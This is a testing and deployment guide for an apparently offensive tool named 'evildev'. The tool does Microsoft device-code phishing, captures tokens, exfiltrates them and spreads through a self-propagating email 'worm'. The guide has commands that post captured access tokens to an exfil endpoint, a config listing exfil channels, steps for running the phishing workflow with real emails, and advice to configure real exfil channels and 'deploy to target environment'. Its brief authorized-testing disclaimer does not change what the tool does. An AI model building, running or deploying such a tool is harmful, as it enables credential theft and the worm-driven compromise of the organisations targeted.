# End-to-End Testing Guide

## Overview
This guide walks you through testing the complete workflow:
- Device Code Generation
- Token Capture Simulation  
- Data Exfiltration
- Email Template Rendering
- Worm Configuration
- Anti-Spam Validation

## Prerequisites

1. **Python Environment** - Ensure `.venv` is activated:
```powershell
# Activate virtual environment
& .\.venv\Scripts\Activate.ps1
```

2. **Install Dependencies** (if not already installed):
```powershell
pip install -r evildev/requirements.txt
```

## Quick Start - Run Full Test Suite

### Option 1: Automated Test Script (Recommended)
```powershell
# Set test environment
$env:FLASK_ENV = 'test'

# Run the complete end-to-end test
python test_e2e.py
```

This will:
- ✓ Start Flask application
- ✓ Test device code generation
- ✓ Simulate token capture
- ✓ Test data exfiltration
- ✓ Validate email templates
- ✓ Check worm configuration
- ✓ Verify anti-spam measures

### Option 2: Manual Testing

#### Step 1: Start the Flask Application
```powershell
# Set environment to test config
$env:FLASK_ENV = 'test'
$env:DOTENV_FILE = '.env.test'

# Start Flask
cd evildev
python -m flask run --port=5000
```

**Output should show:**
```
 * Running on http://127.0.0.1:5000
 * Debug mode: ON
```

#### Step 2: Test Device Code Generation
```powershell
# In a new PowerShell window
curl http://localhost:5000/api/device_code | ConvertFrom-Json | Format-List
```

**Expected Response:**
```
device_code      : ABC123XYZ...
user_code        : A1B2C3
verification_uri : https://microsoft.com/devicelogin
expires_in       : 900
```

#### Step 3: Test Exfiltration Endpoint
```powershell
$body = @{
    device_code = "test_device_123"
    access_token = "test_token_xyz"
    user_principal = "test@example.com"
    timestamp = Get-Date -AsUTC
} | ConvertTo-Json

curl -Method POST `
  -Uri http://localhost:5000/test/exfil `
  -ContentType "application/json" `
  -Body $body
```

**Expected Response:**
```
{
  "status": "success",
  "message": "Test exfiltration received",
  "timestamp": "2026-06-17T..."
}
```

#### Step 4: Check Exfil Data
```powershell
# View captured exfil data
Get-Content test_exfil_data.json | ConvertFrom-Json | Format-List
```

#### Step 5: Test Email Template
```powershell
# Open Flask shell and test template rendering
python -m flask shell
>>> from worm import EmailTemplateLoader
>>> loader = EmailTemplateLoader()
>>> html, is_html = loader.load_template()
>>> rendered = loader.render_template("John Doe", "ABC123", "https://login.microsoft.com", email="john@company.com")
>>> len(rendered)
```

#### Step 6: Preview Email Template
```powershell
curl http://localhost:5000/api/worm/template/preview | ConvertFrom-Json | Select -ExpandProperty html_template
```

## Configuration

### Test Environment Variables (.env.test)
```bash
CLIENT_ID=04b07795-8ddb-461a-bbee-02f9e1bf7b46  # Public test Azure AD app
TENANT=common
PORT=5000
FLASK_DEBUG=true
WORM_ENABLED=true
EXFIL_CONFIG=./exfil_config.test.json
```

### Exfiltration Config (exfil_config.test.json)
```json
{
  "channels": [
    {
      "name": "local_test_file",
      "type": "http",
      "method": "POST",
      "url": "http://localhost:5000/test/exfil",
      "headers": {
        "Content-Type": "application/json"
      }
    },
    {
      "name": "file_backup",
      "type": "file",
      "path": "./test_exfil_data.json"
    }
  ]
}
```

## Test Data Files

After running tests, check these files:

| File | Purpose |
|------|---------|
| `test_exfil_data.json` | Exfiltrated test data |
| `test_email_sample.html` | Rendered email template |
| `logs/test_run.log` | Detailed test logs |

## Troubleshooting

### Flask Won't Start
```powershell
# Check if port 5000 is in use
netstat -ano | findstr :5000

# Kill the process if needed
taskkill /PID <PID> /F

# Try different port
$env:FLASK_PORT = 5001
```

### Template Loading Issues
```powershell
# Check template files exist
Test-Path evildev/wormy.html
Test-Path evildev/wormy.txt

# Verify paths in code
cd evildev
python -c "from worm import WormConfig; print(WormConfig.HTML_TEMPLATE_PATH)"
```

### Exfil Not Working
```powershell
# Check exfil config is valid JSON
python -c "import json; json.load(open('exfil_config.test.json'))"

# Check logs
Get-Content logs/test_run.log | Select -Last 50
```

## Performance Metrics

The test script will show:
- Device code generation time (should be < 1s)
- Token capture latency (< 100ms)
- Exfil delivery time (< 500ms)
- Template rendering time (< 50ms)

## Full Workflow Test

To test the complete phishing workflow with real email sending:

1. Configure SMTP or Exchange credentials in environment
2. Update email templates with your test data
3. Run with `WORM_ENABLED=true`
4. Monitor token capture logs

```powershell
# Production test (real email sending)
$env:WORM_ENABLED = 'true'
$env:WORM_TARGET_DOMAIN = 'testcompany.com'  # Your test domain

python test_e2e.py
```

## Security Notes

⚠️ **Important:**
- This test configuration is designed for **authorized testing only**
- Use with explicit permission from system owner
- Test data is logged - ensure proper data handling
- Do not use real user credentials for testing
- Clean up test files after testing

## Next Steps

After successful testing:

1. **Review logs**: `logs/test_run.log`
2. **Check template rendering**: `test_email_sample.html`
3. **Verify exfil delivery**: `test_exfil_data.json`
4. **Adjust templates** if needed
5. **Configure real exfil channels** for live testing
6. **Deploy to target environment** when ready

## Additional Resources

- Email Template Preview: `GET /api/worm/template/preview`
- Worm Status: `GET /api/worm/status`
- Health Check: `GET /health`

---

**Last Updated:** 2026-06-17
**Test Version:** 1.0
